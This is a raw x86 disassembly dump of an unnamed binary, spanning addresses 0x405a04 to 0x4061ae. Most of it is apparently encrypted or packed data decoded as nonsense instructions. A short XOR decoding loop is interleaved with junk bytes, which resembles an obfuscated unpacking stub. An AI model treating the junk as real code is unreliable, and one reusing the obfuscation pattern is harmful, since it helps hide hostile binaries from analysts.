  405a04:	xchg   edi,eax
  405a05:	(bad)  
  405a07:	stos   DWORD PTR es:[edi],eax
  405a08:	repnz mov al,ds:0x76943d67
  405a0e:	mov    ah,0xa4
  405a10:	iret   
  405a11:	add    edi,edx
  405a13:	sbb    al,0x2b
  405a15:	sbb    edx,ebp
  405a17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a18:	mov    edx,0xdbda1956
  405a1d:	cmp    eax,0xe5fd94e4
  405a22:	push   es
  405a23:	jae    0x405a48
  405a25:	fbstp  TBYTE PTR [ecx-0x2a1a10d0]
  405a2b:	sub    eax,0x51f88539
  405a30:	ret    0xb93b
  405a33:	sub    eax,0x3926ddac
  405a38:	aam    0xe1
  405a3a:	push   es
  405a3b:	inc    esi
  405a3c:	fimul  DWORD PTR ds:[edi+0x30]
  405a40:	mul    eax
  405a42:	in     eax,0xf9
  405a44:	xor    BYTE PTR [edi+edx*2],0x9
  405a48:	imul   ebx,DWORD PTR [eax],0x1f
  405a4b:	push   ds
  405a4c:	pushf  
  405a4d:	imul   edx,DWORD PTR [ebp-0x2cf33662],0x36
  405a54:	inc    ecx
  405a55:	aad    0xa0
  405a57:	dec    esp
  405a58:	inc    ecx
  405a59:	pop    eax
  405a5a:	mov    eax,0x1d73f350
  405a5f:	mov    dl,0xd0
  405a61:	cmp    bh,BYTE PTR [esi]
  405a63:	cli    
  405a64:	xchg   edi,eax
  405a65:	jae    0x405aa2
  405a67:	and    al,0xc
  405a69:	add    ah,bl
  405a6b:	or     BYTE PTR [ebx+0x2d],bl
  405a6e:	cmp    eax,0x51bc7dbb
  405a73:	sub    ah,BYTE PTR [edi-0x21]
  405a76:	dec    ebx
  405a77:	pop    edx
  405a78:	test   DWORD PTR [esp+eax*4+0x421a679b],ecx
  405a7f:	and    BYTE PTR [eax-0x47dcbe7f],dl
  405a85:	mov    edi,0x92e4fe31
  405a8a:	inc    esp
  405a8b:	fiadd  WORD PTR [ecx-0x36]
  405a8e:	mov    ch,0x75
  405a90:	jo     0x405ae7
  405a92:	pop    eax
  405a93:	js     0x405aa3
  405a95:	or     DWORD PTR [edx],eax
  405a97:	add    al,0xf3
  405a99:	jne    0x405aaa
  405a9b:	call   0x59a4fb59
  405aa0:	push   0xfffffffa
  405aa2:	pop    es
  405aa3:	mov    eax,ds:0x7c2d5476
  405aa8:	int    0x3d
  405aaa:	les    edi,FWORD PTR [eax+0x33c2c854]
  405ab0:	fwait
  405ab1:	mov    ?,WORD PTR ds:0x37ec6fcb
  405ab7:	popf   
  405ab8:	test   al,0xe4
  405aba:	pop    ebx
  405abb:	outs   dx,BYTE PTR ds:[esi]
  405abc:	add    bh,BYTE PTR [esi-0xf]
  405abf:	out    dx,al
  405ac0:	or     esi,esi
  405ac2:	fs xor al,ah
  405ac5:	cmp    eax,0xc0926cc5
  405aca:	leave  
  405acb:	sub    esi,edi
  405acd:	mov    esp,DWORD PTR [ebx-0x696aa795]
  405ad3:	xchg   ebp,eax
  405ad4:	lahf   
  405ad5:	xchg   esi,eax
  405ad6:	adc    DWORD PTR [esi-0x23],0xffffffa3
  405ada:	cmp    ecx,edi
  405adc:	inc    ecx
  405add:	push   esp
  405ade:	(bad)  
  405adf:	std    
  405ae0:	dec    ebx
  405ae1:	in     al,dx
  405ae2:	(bad)  
  405ae3:	and    bh,BYTE PTR [eax+0xa]
  405ae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ae7:	mov    ds:0x18fabc5c,al
  405aec:	(bad)  
  405aed:	test   al,0xb6
  405aef:	popf   
  405af0:	pusha  
  405af1:	mov    ds:0xaf870687,eax
  405af6:	fistp  DWORD PTR [ebx+0x69]
  405af9:	sub    ecx,DWORD PTR [ebp-0x5d]
  405afc:	in     al,0x9b
  405afe:	cli    
  405aff:	sub    ebx,DWORD PTR [ecx+esi*4-0x5cf57158]
  405b06:	xlat   BYTE PTR ds:[ebx]
  405b07:	push   edx
  405b08:	std    
  405b09:	pusha  
  405b0a:	rcl    BYTE PTR [ebp-0x7e],1
  405b0d:	dec    ecx
  405b0e:	iret   
  405b0f:	cmp    eax,0xcfb529b2
  405b14:	mov    ch,0xb3
  405b16:	xchg   ebx,eax
  405b17:	jp     0x405ace
  405b19:	das    
  405b1a:	inc    edi
  405b1b:	jl     0x405ac2
  405b1d:	loope  0x405aa4
  405b1f:	clc    
  405b20:	dec    esp
  405b21:	sbb    bh,BYTE PTR ds:0x1f9b9681
  405b27:	jo     0x405b63
  405b29:	or     dh,BYTE PTR [esi-0x14]
  405b2c:	cmp    dl,BYTE PTR [eax-0x4a]
  405b2f:	out    dx,eax
  405b30:	pop    ds
  405b31:	push   ecx
  405b32:	inc    esp
  405b33:	push   es
  405b34:	sbb    edi,DWORD PTR [edi]
  405b36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b37:	pop    esi
  405b38:	mov    esi,0x9f881aa7
  405b3d:	mov    edx,0x6707101f
  405b42:	cwde   
  405b43:	mov    ecx,DWORD PTR [ecx+0x2]
  405b46:	cmp    BYTE PTR [ebx+ecx*8],ch
  405b49:	fisttp WORD PTR [ebp+0x2c09453b]
  405b4f:	pop    ds
  405b50:	dec    esp
  405b51:	cmp    ch,bl
  405b53:	and    DWORD PTR [ecx+0x62],ecx
  405b56:	jge    0x405b01
  405b58:	inc    edx
  405b59:	fmul   st(2),st
  405b5b:	adc    DWORD PTR ds:0xfe90beba,edx
  405b61:	(bad)  
  405b62:	jle    0x405bd8
  405b64:	fisub  DWORD PTR [eax]
  405b66:	cmp    DWORD PTR [edi-0x18],0x55
  405b6a:	or     ah,dl
  405b6c:	cmp    eax,0x8da0a962
  405b71:	in     eax,0x30
  405b73:	mov    ss,edi
  405b75:	mov    al,0x7
  405b77:	xchg   DWORD PTR [ebp+0xc],edx
  405b7a:	cs in  eax,dx
  405b7c:	push   es
  405b7d:	or     esi,DWORD PTR [eax+0x20]
  405b80:	rcl    dl,cl
  405b82:	xchg   edi,eax
  405b83:	cmc    
  405b84:	jge    0x405b54
  405b86:	fs pop edx
  405b88:	mov    gs,WORD PTR [eax-0x59]
  405b8b:	rol    edi,cl
  405b8d:	xchg   ecx,eax
  405b8e:	and    BYTE PTR ds:0xd012a659,bl
  405b94:	outs   dx,DWORD PTR ds:[esi]
  405b95:	imul   edx,DWORD PTR [edx-0x6d],0x41d0b5d4
  405b9c:	les    edi,FWORD PTR [ebx-0x72873a0f]
  405ba2:	and    DWORD PTR [edx],ecx
  405ba4:	sbb    eax,0x178f38a0
  405ba9:	push   eax
  405baa:	scas   al,BYTE PTR es:[edi]
  405bab:	imul   ebx,DWORD PTR [esi],0xffffffb6
  405bae:	adc    eax,0xbc44a19a
  405bb3:	push   cs
  405bb4:	test   DWORD PTR [edx-0x67e482e],ebx
  405bba:	push   0xfffffffe
  405bbc:	dec    edx
  405bbd:	inc    eax
  405bbe:	dec    ecx
  405bbf:	sbb    DWORD PTR [eax+ebp*1-0x76269b40],ebx
  405bc6:	pop    ss
  405bc7:	pop    edx
  405bc8:	mov    bh,0x29
  405bca:	cmp    al,0x9
  405bcc:	imul   esp,DWORD PTR [ebx-0x1dde201b],0xffffffe2
  405bd3:	fidiv  WORD PTR [ebp+0xd]
  405bd6:	cmp    al,ch
  405bd8:	sahf   
  405bd9:	dec    BYTE PTR [esi+0x3e2ab513]
  405bdf:	cwde   
  405be0:	scas   eax,DWORD PTR es:[edi]
  405be1:	minps  xmm4,XMMWORD PTR [eax]
  405be4:	inc    eax
  405be5:	lea    esi,[esp+esi*2]
  405be8:	fild   QWORD PTR [ecx+0x263f5355]
  405bee:	cmp    eax,0xcc7c5fec
  405bf3:	cwde   
  405bf4:	sahf   
  405bf5:	mov    eax,ds:0xb531c8c2
  405bfa:	pop    ebx
  405bfb:	push   es
  405bfc:	jmp    0x405bc2
  405bfe:	jne    0x405c2f
  405c00:	sbb    bl,dh
  405c02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c03:	cmc    
  405c04:	pop    ebp
  405c05:	les    ebp,FWORD PTR [esi+0x20]
  405c08:	or     BYTE PTR [edi+ebp*8-0x4a],0x70
  405c0d:	pop    ss
  405c0e:	out    dx,eax
  405c0f:	sub    edi,eax
  405c11:	add    edi,DWORD PTR [ebp+0x10]
  405c14:	xor    edx,ecx
  405c16:	add    edx,esi
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0xb65d0ed0,dx
  405c45:	sub    BYTE PTR [edi-0x26],0x50
  405c49:	cmp    edi,DWORD PTR [esi+0x7e]
  405c4c:	mov    ebp,0x417e7e71
  405c51:	shl    DWORD PTR [ebx-0x55],1
  405c54:	mov    BYTE PTR [esi],al
  405c56:	add    BYTE PTR [ebx-0x75a16755],bh
  405c5c:	ins    DWORD PTR es:[edi],dx
  405c5d:	aaa    
  405c5e:	pop    ecx
  405c5f:	mov    bh,0xbd
  405c61:	bound  eax,QWORD PTR [esi]
  405c63:	cmc    
  405c64:	pop    es
  405c65:	iret   
  405c66:	or     eax,0xd3f019df
  405c6b:	inc    ebp
  405c6c:	push   esp
  405c6d:	hlt    
  405c6e:	stc    
  405c6f:	ror    DWORD PTR [eax],cl
  405c71:	test   DWORD PTR [ecx+0xfe57a57],ebx
  405c77:	(bad)  
  405c79:	pop    edx
  405c7a:	(bad)  
  405c7b:	jmp    0x405cde
  405c7d:	gs retf 
  405c7f:	pop    esp
  405c80:	addr16 (bad) 
  405c82:	push   ss
  405c83:	fwait
  405c84:	sub    al,0x61
  405c86:	arpl   WORD PTR [ebx-0x7f],bp
  405c89:	call   0x385e301d
  405c8e:	adc    al,0x23
  405c90:	lock jl 0x405c35
  405c93:	lock sahf 
  405c95:	pop    es
  405c96:	rcr    BYTE PTR [edx+0x4c],0xa6
  405c9a:	ins    DWORD PTR es:[edi],dx
  405c9b:	fidiv  WORD PTR [edi]
  405c9d:	cmc    
  405c9e:	sbb    al,0x7b
  405ca0:	jl     0x405c8e
  405ca2:	and    esp,edx
  405ca4:	pop    esi
  405ca5:	outs   dx,DWORD PTR ds:[esi]
  405ca6:	pop    eax
  405ca7:	cmp    al,0xbd
  405ca9:	pop    esp
  405caa:	jo     0x405c82
  405cac:	or     al,0x8f
  405cae:	push   ebp
  405caf:	add    DWORD PTR [ebx+0x1f],ebp
  405cb2:	adc    al,BYTE PTR [ebx-0x65d16183]
  405cb8:	int    0x50
  405cba:	mov    edx,0x2131bcb0
  405cbf:	and    ch,BYTE PTR [ebp+0x65]
  405cc2:	scas   al,BYTE PTR es:[edi]
  405cc3:	aam    0xdc
  405cc5:	std    
  405cc6:	ins    DWORD PTR es:[edi],dx
  405cc7:	mov    ecx,0xedcae7d8
  405ccc:	and    BYTE PTR [ebx],ah
  405cce:	pop    ebx
  405ccf:	test   eax,0x8e883557
  405cd4:	repz add edx,DWORD PTR [esi-0x32e809b3]
  405cdb:	xor    ah,BYTE PTR fs:[esi+0x94fce85]
  405ce2:	pusha  
  405ce3:	inc    edi
  405ce4:	jae    0x405cb7
  405ce6:	add    ah,dh
  405ce8:	in     al,dx
  405ce9:	mov    ds:0xe841ca67,al
  405cee:	lock mov cl,0x7c
  405cf1:	pop    eax
  405cf2:	loopne 0x405cf4
  405cf4:	fisttp WORD PTR [eax+ecx*8-0x13f79cb9]
  405cfb:	push   es
  405cfc:	push   edx
  405cfd:	sub    DWORD PTR [eax],ecx
  405cff:	adc    al,0xb9
  405d01:	mov    ds:0x2899ed4f,al
  405d06:	inc    ecx
  405d08:	push   ds
  405d09:	repnz mov ch,0xb1
  405d0c:	outs   dx,BYTE PTR ds:[esi]
  405d0d:	mov    ecx,gs
  405d0f:	in     eax,0x8e
  405d11:	jmp    0xfb86:0xb1f3e72c
  405d18:	cld    
  405d19:	mov    ds:0x282bfc49,eax
  405d1e:	xor    esi,DWORD PTR [esi-0x31]
  405d21:	data16 mov dh,0x32
  405d24:	in     al,0xbe
  405d26:	push   0x40
  405d28:	test   eax,0x4c2e57e4
  405d2d:	pop    ss
  405d2e:	pushf  
  405d2f:	iret   
  405d30:	and    eax,0x717001a9
  405d35:	daa    
  405d36:	jo     0x405ce7
  405d38:	(bad)
  405d3c:	or     ah,BYTE PTR [edi+edi*1-0x2c2c0f86]
  405d43:	sbb    DWORD PTR [esi-0x65],0xffffff96
  405d47:	xor    eax,edx
  405d49:	inc    edx
  405d4a:	and    DWORD PTR [ebx+0x3358bc07],esp
  405d50:	out    dx,al
  405d51:	scas   al,BYTE PTR es:[edi]
  405d52:	shl    dl,1
  405d54:	fnstenv [esi+0x4db1e058]
  405d5a:	push   esi
  405d5b:	pop    edx
  405d5c:	xchg   DWORD PTR [ecx],ebp
  405d5e:	jne    0x405da6
  405d60:	add    dh,BYTE PTR [esi+ebp*4-0x5aabde62]
  405d67:	cmp    ebp,DWORD PTR [edi-0x6e]
  405d6a:	pop    esp
  405d6b:	idiv   dl
  405d6d:	aaa    
  405d6e:	into   
  405d6f:	xor    DWORD PTR [ecx+0x4b958f6c],ebp
  405d75:	neg    ebx
  405d77:	popa   
  405d78:	inc    ebp
  405d79:	push   cs
  405d7a:	das    
  405d7b:	lods   al,BYTE PTR ds:[esi]
  405d7c:	jmp    0xcf8a40f2
  405d81:	or     bl,ah
  405d83:	js     0x405d71
  405d85:	aaa    
  405d86:	or     eax,0x22f66289
  405d8b:	outs   dx,BYTE PTR ds:[esi]
  405d8c:	adc    ebx,eax
  405d8e:	int3   
  405d8f:	fstp   QWORD PTR [esi]
  405d91:	out    dx,eax
  405d92:	jl     0x405de8
  405d94:	cld    
  405d95:	inc    esp
  405d96:	lods   al,BYTE PTR ds:[esi]
  405d97:	nop
  405d98:	ins    BYTE PTR es:[edi],dx
  405d99:	push   esi
  405d9a:	ja     0x405de2
  405d9c:	je     0x405d70
  405d9e:	jo     0x405d6b
  405da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405da1:	aad    0xc8
  405da3:	addr16 cmp al,0xb0
  405da6:	arpl   WORD PTR [esi],bp
  405da8:	mov    ds:0x7340deff,al
  405dad:	pop    edi
  405dae:	in     al,dx
  405daf:	pop    es
  405db0:	sar    ecx,cl
  405db2:	jbe    0x405d3c
  405db4:	adc    bh,BYTE PTR [edx]
  405db6:	jo     0x405e1c
  405db8:	sub    dl,BYTE PTR [edx+0x7d]
  405dbb:	xchg   ecx,eax
  405dbc:	mov    al,0xe4
  405dbe:	out    dx,al
  405dbf:	xchg   edi,eax
  405dc0:	mov    BYTE PTR [ebx-0x7e67a982],bh
  405dc6:	mov    ah,0xc1
  405dc8:	scas   al,BYTE PTR es:[edi]
  405dc9:	movaps XMMWORD PTR ds:0xdc79e0f6,xmm6
  405dd0:	retf   
  405dd1:	cwde   
  405dd2:	add    eax,0xb3489e73
  405dd7:	(bad)
  405dda:	inc    edi
  405ddb:	dec    esp
  405ddc:	es mov edi,0xd6112806
  405de2:	sahf   
  405de3:	or     al,0x6a
  405de5:	mov    edi,0x14b4eb61
  405dea:	sbb    al,0x94
  405dec:	adc    al,0x7e
  405dee:	push   ecx
  405def:	mov    ds:0x47b475f,al
  405df4:	popa   
  405df5:	fisubr DWORD PTR [edi]
  405df7:	sub    dh,dh
  405df9:	and    BYTE PTR [ebx+0x3a],dl
  405dfc:	ficomp DWORD PTR [eax-0x654c700d]
  405e02:	sub    edi,DWORD PTR [ebx]
  405e04:	leave  
  405e05:	xor    DWORD PTR [edi+eiz*8+0x22cb1a2],esi
  405e0c:	xor    eax,0x66dc3dc
  405e11:	imul   eax,DWORD PTR [esi],0xecd8f52
  405e17:	mov    bh,0xd5
  405e19:	inc    esp
  405e1a:	call   DWORD PTR [esi+ecx*8+0x6cdef47f]
  405e21:	pop    esp
  405e22:	push   ss
  405e23:	fdiv   QWORD PTR [eax-0x26]
  405e26:	int    0x98
  405e28:	jbe    0x405e8e
  405e2a:	mov    ebx,0x30a333fc
  405e2f:	xor    al,0xf0
  405e31:	call   0x37b9:0x95411c2d
  405e38:	scas   al,BYTE PTR es:[edi]
  405e39:	int    0xa3
  405e3b:	daa    
  405e3c:	and    al,BYTE PTR [eax-0x292623e]
  405e42:	cwde   
  405e43:	fimul  WORD PTR [ebx]
  405e45:	shl    bl,0x2f
  405e48:	and    bl,BYTE PTR [ebx-0xb]
  405e4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e4c:	add    esp,esi
  405e4e:	popa   
  405e4f:	jecxz  0x405eba
  405e51:	stos   DWORD PTR es:[edi],eax
  405e52:	push   esp
  405e53:	sti    
  405e54:	arpl   WORD PTR [edx+0x7efed115],ax
  405e5a:	push   0x72
  405e5c:	push   es
  405e5d:	(bad)  
  405e5e:	jns    0x405e7f
  405e60:	push   ebp
  405e61:	sahf   
  405e62:	push   ebx
  405e63:	mov    al,ds:0xa22815b
  405e68:	pop    eax
  405e69:	pop    ebp
  405e6a:	cmp    al,BYTE PTR ds:[ecx+0x65]
  405e6e:	pop    ss
  405e6f:	std    
  405e70:	sub    esp,ebp
  405e72:	sbb    bh,BYTE PTR [edi-0x7776c776]
  405e78:	in     eax,0x55
  405e7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e7b:	sbb    eax,0x30f8acdf
  405e80:	fs push ecx
  405e82:	in     al,0x17
  405e84:	loope  0x405e19
  405e86:	cs push esp
  405e88:	sbb    eax,0x2d1c1da5
  405e8d:	sbb    eax,0x74a95093
  405e92:	std    
  405e93:	jae    0x405e35
  405e95:	outs   dx,BYTE PTR ds:[esi]
  405e96:	dec    ecx
  405e97:	aad    0x5b
  405e99:	add    DWORD PTR [bp-0x3f2e],esp
  405e9e:	dec    edx
  405e9f:	inc    ebx
  405ea0:	push   es
  405ea1:	sub    DWORD PTR [ecx*4+0x51bbdfb8],edx
  405ea8:	clc    
  405ea9:	pop    ds
  405eaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eab:	shl    DWORD PTR [ecx+0x6c6a724c],1
  405eb1:	sub    DWORD PTR [ecx+0x1c],ebx
  405eb4:	sub    BYTE PTR [ebx],ah
  405eb6:	jnp    0x405e8f
  405eb8:	adc    edx,ebx
  405eba:	les    ecx,FWORD PTR [edi+0x4c]
  405ebd:	lods   al,BYTE PTR ds:[esi]
  405ebe:	fdivr  QWORD PTR [eax]
  405ec0:	xor    BYTE PTR ds:0xe2243772,0xa4
  405ec7:	pop    ecx
  405ec8:	scas   al,BYTE PTR es:[edi]
  405ec9:	xchg   esi,eax
  405eca:	sub    bl,BYTE PTR [ecx+ecx*8-0x35f17bcf]
  405ed1:	bound  eax,QWORD PTR [edi+0x48971c74]
  405ed7:	dec    ecx
  405ed8:	mov    cl,0xfa
  405eda:	rol    BYTE PTR [edi+0x11],0xed
  405ede:	add    eax,0xedf60d4c
  405ee3:	ret    
  405ee4:	push   edx
  405ee5:	xchg   esi,eax
  405ee6:	fist   WORD PTR [ecx+0x7486ba4b]
  405eec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eed:	sub    eax,0x8726c797
  405ef2:	xor    BYTE PTR [ebx],ch
  405ef4:	jmp    0x405ec4
  405ef6:	xchg   edx,eax
  405ef7:	jecxz  0x405ebf
  405ef9:	pop    es
  405efa:	jmp    0x405f21
  405efc:	adc    dh,BYTE PTR [ecx+0x5b]
  405eff:	ins    DWORD PTR es:[edi],dx
  405f00:	jo     0x405eef
  405f02:	sar    BYTE PTR [edi+edx*1+0x76],1
  405f06:	add    DWORD PTR [ebp-0x4f],ecx
  405f09:	sbb    cl,BYTE PTR [ecx]
  405f0b:	mov    ds:0x8c0f2acb,eax
  405f11:	pop    ss
  405f12:	lds    ebp,FWORD PTR [esi+ecx*2+0x21bc811]
  405f19:	xchg   esi,eax
  405f1a:	jecxz  0x405f32
  405f1c:	push   0x268c79a7
  405f21:	(bad)  
  405f22:	dec    ebp
  405f23:	jmp    0x4529:0x646ffda0
  405f2a:	je     0x405ec0
  405f2c:	ja     0x405eec
  405f2e:	jne    0x405f4c
  405f30:	adc    BYTE PTR [ebp-0x4e],cl
  405f33:	imul   edi,edx,0xffffffae
  405f36:	sbb    BYTE PTR [eax-0x41],al
  405f39:	mov    ds:0x52d4848c,eax
  405f3e:	pusha  
  405f3f:	iret   
  405f40:	xor    esp,ebp
  405f42:	xchg   ebp,eax
  405f43:	xchg   edx,eax
  405f44:	pushf  
  405f45:	adc    eax,0xc49e2407
  405f4a:	push   ecx
  405f4b:	xchg   ebp,eax
  405f4c:	jmp    0x5de:0xe2bf3f55
  405f53:	(bad)  
  405f54:	sbb    eax,0x3fe345aa
  405f59:	sbb    ebp,ebp
  405f5b:	sub    DWORD PTR [ebx+ebx*4],0xb7214217
  405f62:	adc    al,0xf4
  405f64:	fsubr  DWORD PTR [edi-0x59f079ff]
  405f6a:	sbb    al,0xc5
  405f6c:	mov    DWORD PTR [esp+ecx*8-0x237f727a],ebp
  405f73:	adc    bl,BYTE PTR [edx]
  405f75:	sub    al,0x8a
  405f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f78:	(bad)  ds:0xfe258dde
  405f7e:	cli    
  405f7f:	push   ds
  405f80:	dec    esp
  405f81:	loopne 0x405fc9
  405f83:	sub    al,0x22
  405f85:	dec    edi
  405f86:	xor    DWORD PTR [edi],edi
  405f88:	mov    cs,WORD PTR [ecx]
  405f8a:	lods   eax,DWORD PTR ds:[esi]
  405f8b:	mov    esi,0xce89c6d1
  405f90:	sbb    DWORD PTR [esi+0x77],ecx
  405f93:	or     BYTE PTR [eax],al
  405f95:	cmp    eax,0xab711a24
  405f9a:	add    DWORD PTR [ebp+0x2c03dec2],ebp
  405fa0:	or     al,0x61
  405fa2:	test   BYTE PTR [edx],bh
  405fa4:	in     al,dx
  405fa5:	adc    al,dl
  405fa7:	dec    esi
  405fa8:	mov    dh,0x43
  405faa:	shl    BYTE PTR [edi+0xb6be60b],0x6f
  405fb1:	aad    0x9d
  405fb3:	cmc    
  405fb4:	mov    DWORD PTR [eax-0x15],ebx
  405fb7:	ins    DWORD PTR es:[edi],dx
  405fb8:	shr    DWORD PTR [edx-0x16],0x5
  405fbc:	lahf   
  405fbd:	dec    esp
  405fbe:	jns    0x405f41
  405fc0:	lock pop edi
  405fc2:	in     eax,dx
  405fc3:	xor    edx,DWORD PTR [bx+di-0x3291]
  405fc8:	retf   0x28bf
  405fcb:	push   esi
  405fcc:	dec    edi
  405fcd:	pop    es
  405fce:	dec    ebp
  405fcf:	mov    esi,DWORD PTR [edi-0x1a]
  405fd2:	inc    esi
  405fd3:	xor    bh,BYTE PTR [ecx]
  405fd5:	adc    BYTE PTR [eax-0x4a5c89ab],al
  405fdb:	adc    cl,ch
  405fdd:	mov    esp,0x3927ff0
  405fe2:	mov    dh,BYTE PTR [ebx+edi*1-0x49791a5e]
  405fe9:	adc    eax,0xf5e9d8d9
  405fee:	out    dx,al
  405fef:	cmp    BYTE PTR [edx],bl
  405ff1:	cmp    al,0x6d
  405ff3:	or     DWORD PTR [edx],ecx
  405ff5:	jg     0x405f85
  405ff7:	cmp    cl,bh
  405ff9:	jnp    0x406071
  405ffb:	iret   
  405ffc:	pop    esp
  405ffd:	cwde   
  405ffe:	in     al,dx
  405fff:	xor    DWORD PTR [ecx+0x60],ebx
  406002:	mov    ecx,0x3f7cf48e
  406007:	ror    DWORD PTR [esi-0x5],0xa
  40600b:	and    edi,DWORD PTR [eax+0x3f]
  40600e:	mov    esp,0x758bfe03
  406013:	or     BYTE PTR [edi],cl
  406015:	scas   eax,DWORD PTR es:[edi]
  406016:	cli    
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	loop   0x40606d
  406058:	add    ebp,ebp
  40605a:	lahf   
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0x2b7e7e71
  406063:	xor    BYTE PTR [ecx+0x5d],al
  406066:	or     esi,edx
  406068:	jo     0x4060dd
  40606a:	xor    DWORD PTR [edi+0x3e6d7399],edx
  406070:	or     edx,DWORD PTR cs:[esi-0x600b4686]
  406077:	or     eax,0x364e7b4a
  40607c:	out    0xea,eax
  40607e:	pop    ebp
  40607f:	jmp    0x4060dc
  406081:	add    eax,0x28e7962
  406086:	iret   
  406087:	jecxz  0x406034
  406089:	or     DWORD PTR [ecx+0x9],ecx
  40608c:	xchg   ebp,eax
  40608d:	jb     0x4060d6
  40608f:	sbb    BYTE PTR [edx-0x3f],bh
  406092:	fs ins BYTE PTR es:[edi],dx
  406094:	push   ds
  406095:	push   ebx
  406096:	cdq    
  406097:	pop    ds
  406098:	not    DWORD PTR [ebp-0xf]
  40609b:	dec    esp
  40609c:	add    eax,0xc0a67360
  4060a1:	sbb    eax,0x10ecfd5e
  4060a6:	mov    eax,0x353600c1
  4060ab:	sbb    BYTE PTR [eax+0x22],bh
  4060ae:	test   DWORD PTR [ebx+0x7f99e112],ecx
  4060b4:	popa   
  4060b5:	inc    edi
  4060b6:	sti    
  4060b7:	xchg   edx,eax
  4060b8:	mov    edx,0xf70b64f4
  4060bd:	inc    esp
  4060be:	jno    0x4060b1
  4060c0:	or     al,0xd
  4060c2:	aaa    
  4060c3:	fld    TBYTE PTR [ecx+0x76f2b278]
  4060c9:	mov    edi,0xc5c0de28
  4060ce:	lods   eax,DWORD PTR ds:[esi]
  4060cf:	rol    esi,cl
  4060d1:	mov    edi,0x40aa23c7
  4060d6:	mov    bh,0x93
  4060d8:	mov    ebx,DWORD PTR [ebx]
  4060da:	dec    ebp
  4060db:	outs   dx,DWORD PTR ds:[esi]
  4060dd:	jge    0x4060d0
  4060df:	or     ebp,DWORD PTR [esi-0x5ba369f4]
  4060e5:	fidiv  WORD PTR [eax+ebp*1-0x65571515]
  4060ec:	dec    edx
  4060ed:	sub    al,0x13
  4060ef:	or     ebp,esp
  4060f1:	lahf   
  4060f2:	scas   eax,DWORD PTR es:[edi]
  4060f3:	(bad)
  4060f6:	or     al,0x29
  4060f8:	dec    esp
  4060f9:	push   ss
  4060fa:	jns    0x4060f3
  4060fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060fd:	sub    DWORD PTR [ebx-0x25],0x9e100a14
  406104:	pop    es
  406105:	inc    ebx
  406106:	xor    bh,BYTE PTR [ecx-0x6922b64a]
  40610c:	sbb    edx,edi
  40610e:	lds    eax,FWORD PTR [esi]
  406110:	ret    
  406111:	and    eax,0x2c190376
  406116:	pop    ss
  406117:	pop    eax
  406118:	jmp    0x406181
  40611a:	(bad)  
  40611c:	jle    0x40614b
  40611e:	cmp    ebx,DWORD PTR [eax-0x33]
  406121:	or     DWORD PTR [eax+0x1e],edi
  406124:	sub    al,ah
  406126:	imul   ecx,esp,0xffffffa8
  406129:	xchg   ecx,eax
  40612a:	dec    edx
  40612b:	std    
  40612c:	or     bh,BYTE PTR ds:0x5e2169c1
  406132:	int3   
  406133:	mov    ecx,0x50c2eaaf
  406138:	outs   dx,DWORD PTR ds:[esi]
  406139:	adc    esi,DWORD PTR fs:[edi]
  40613c:	ja     0x40616b
  40613e:	int3   
  40613f:	mov    esp,0xfad02157
  406144:	lahf   
  406145:	mov    edx,0xb606e6ef
  40614a:	xor    BYTE PTR [edx+0x6058ac2f],bl
  406150:	pop    ss
  406151:	pop    ebp
  406152:	sub    DWORD PTR [ebx+0x1],ecx
  406155:	push   esp
  406156:	xor    esi,DWORD PTR [edi-0x34]
  406159:	fistp  WORD PTR [eax-0x45]
  40615c:	cmp    al,0x3b
  40615e:	std    
  40615f:	mov    esp,0xa4dfa250
  406164:	mov    eax,0xd4f12b4b
  406169:	xor    DWORD PTR [ebp-0x4d],0x792f8650
  406170:	arpl   WORD PTR [ecx+ecx*2+0x7803f340],bp
  406177:	pop    edx
  406178:	into   
  406179:	iret   
  40617a:	or     eax,0x81789df7
  40617f:	xchg   edx,eax
  406180:	test   al,0xc4
  406182:	sub    ch,0x53
  406185:	inc    edi
  406186:	hlt    
  406187:	leave  
  406188:	push   ecx
  406189:	hlt    
  40618a:	and    BYTE PTR [eax+0x662f572a],bh
  406190:	nop
  406191:	call   0x55c7:0xcd3f946
  406198:	push   esp
  406199:	or     edi,edi
  40619b:	stos   BYTE PTR es:[edi],al
  40619c:	das    
  40619d:	popf   
  40619e:	cwde   
  40619f:	dec    ebp
  4061a0:	outs   dx,BYTE PTR ds:[esi]
  4061a1:	into   
  4061a2:	adc    ch,BYTE PTR [ecx+0x64]
  4061a5:	mov    edi,0xc7592913
  4061aa:	mov    al,0x25
  4061ac:	pop    ds
  4061ad:	hlt    
  4061ae:	shl    DWORD PTR [ebx-0x5eb76656],0x90
